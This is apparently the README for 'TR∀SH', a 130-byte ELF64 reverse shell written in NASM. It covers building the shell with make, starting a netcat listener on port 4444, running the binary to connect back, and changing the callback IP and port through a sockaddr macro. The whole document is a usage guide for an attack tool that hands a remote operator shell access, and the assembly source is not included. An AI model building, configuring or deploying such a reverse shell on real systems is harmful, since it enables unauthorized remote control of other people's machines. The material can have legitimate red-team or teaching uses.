# TR∀SH

**T**iny (130 bytes, ELF64) **R**e**V**erse **SH**ell.

Tested on Linux 6.5.0.

## Usage

Configure (see below) and build with [NASM](https://www.nasm.us/) using the included Makefile:

    $ make

Start netcat listener:

    $ nc -nvlp 4444 127.0.0.1

Connect reverse shell:

    $ ./trvsh

## Configuration

To change IP & port adjust the values passed to the `sockaddr` macro. For
example, to use `192.168.0.1` with port `1337` use:

```nasm
sockaddr: dq sockaddr(192, 168, 0, 1, 1337, 2)
```

The 2 here is the address family, in this case `AF_INET`.
